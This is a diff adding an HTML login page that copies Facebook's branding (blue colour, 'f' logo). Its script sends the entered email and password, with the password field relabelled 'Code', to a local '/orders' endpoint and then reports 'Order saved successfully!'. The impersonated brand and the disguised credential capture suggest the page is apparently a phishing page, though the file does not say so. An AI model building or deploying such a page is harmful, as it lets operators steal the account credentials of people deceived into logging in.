@@ -1,0 +1,286 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #e9eef0;
+            overflow: hidden;
+        }
+
+        .circle {
+            position: fixed;
+            border-radius: 50%;
+            background: #e9eef0;
+            box-shadow:
+                10px 10px 25px rgba(160,170,175,.35),
+                -10px -10px 25px rgba(255,255,255,.9);
+        }
+
+        .circle1 {
+            width: 110px;
+            height: 110px;
+            top: 50px;
+            left: 25px;
+        }
+
+        .circle2 {
+            width: 70px;
+            height: 70px;
+            top: 260px;
+            right: 25px;
+        }
+
+        .circle3 {
+            width: 45px;
+            height: 45px;
+            top: 80px;
+            right: 45px;
+        }
+
+        .login-box {
+            width: 340px;
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+            background: #e9eef0;
+
+            box-shadow:
+                12px 12px 25px rgba(160,170,175,.45),
+                -12px -12px 25px rgba(255,255,255,.95);
+
+            position: relative;
+            z-index: 10;
+        }
+
+        .facebook-logo {
+            width: 52px;
+            height: 52px;
+            margin: 0 auto 15px;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            border-radius: 50%;
+            background: #e9eef0;
+
+            color: #1877f2;
+            font-size: 34px;
+            font-weight: bold;
+
+            box-shadow:
+                6px 6px 12px rgba(160,170,175,.4),
+                -6px -6px 12px rgba(255,255,255,.9);
+        }
+
+        h1 {
+            color: #202b31;
+            font-size: 25px;
+            margin-bottom: 7px;
+        }
+
+        .subtitle {
+            color: #7d878b;
+            font-size: 11px;
+            margin-bottom: 22px;
+        }
+
+        .input-box {
+            margin-bottom: 13px;
+        }
+
+        .input-box input {
+            width: 100%;
+            height: 44px;
+            border: none;
+            outline: none;
+            border-radius: 9px;
+            background: #e9eef0;
+            padding: 0 14px;
+            font-size: 12px;
+
+            box-shadow:
+                inset 4px 4px 8px rgba(160,170,175,.35),
+                inset -4px -4px 8px rgba(255,255,255,.9);
+        }
+
+        .input-box input::placeholder {
+            color: #929b9f;
+        }
+
+        .options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 8px 2px 17px;
+            font-size: 9px;
+        }
+
+        .options label {
+            color: #707a7e;
+        }
+
+        .options input {
+            accent-color: #1877f2;
+        }
+
+        .options a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .login-btn {
+            width: 100%;
+            height: 44px;
+            border: none;
+            border-radius: 9px;
+            background: #e9eef0;
+            color: #1877f2;
+            font-size: 12px;
+            font-weight: bold;
+            cursor: pointer;
+
+            box-shadow:
+                7px 7px 14px rgba(160,170,175,.4),
+                -7px -7px 14px rgba(255,255,255,.9);
+
+            transition: .2s;
+        }
+
+        .login-btn:hover {
+            background: #1877f2;
+            color: white;
+        }
+
+        .login-btn:active {
+            transform: scale(.97);
+        }
+
+        .register {
+            margin-top: 25px;
+            color: #818b8f;
+            font-size: 9px;
+        }
+
+        .register a {
+            color: #1877f2;
+            text-decoration: none;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="circle circle1"></div>
+    <div class="circle circle2"></div>
+    <div class="circle circle3"></div>
+
+    <div class="login-box">
+
+        <div class="facebook-logo">f</div>
+
+        <h1>Welcome</h1>
+
+        <p class="subtitle">
+            Login to continue your journey
+        </p>
+
+        <form id="loginForm">
+
+            <div class="input-box">
+                <input
+                    type="text"
+                    name="email"
+                    placeholder="Email Address"
+                    required
+                >
+            </div>
+
+            <div class="input-box">
+                <input
+                    type="password"
+                    name="password"
+                    placeholder="Code"
+                    required
+                >
+            </div>
+
+            <div class="options">
+
+                <label>
+                    <input type="checkbox">
+                    Remember me
+                </label>
+
+                <a href="#">Forgot Code?</a>
+
+            </div>
+
+            <button type="submit" class="login-btn">
+                Login
+            </button>
+
+        </form>
+
+        <p class="register">
+            Don't have an account?
+            <a href="#">+</a>
+        </p>
+
+    </div>
+
+    <script>
+        const form = document.getElementById("loginForm");
+
+        form.addEventListener("submit", async function(event) {
+            event.preventDefault();
+
+            const email = form.elements.email.value;
+            const code = form.elements.password.value;
+
+            try {
+                const response = await fetch("http://localhost:3000/orders", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        code: code
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    alert("Order saved successfully!");
+                    form.reset();
+                }
+
+            } catch (error) {
+                alert("Could not connect to server.");
+                console.error(error);
+            }
+        });
+    </script>
+
+</body>
+</html>
+```
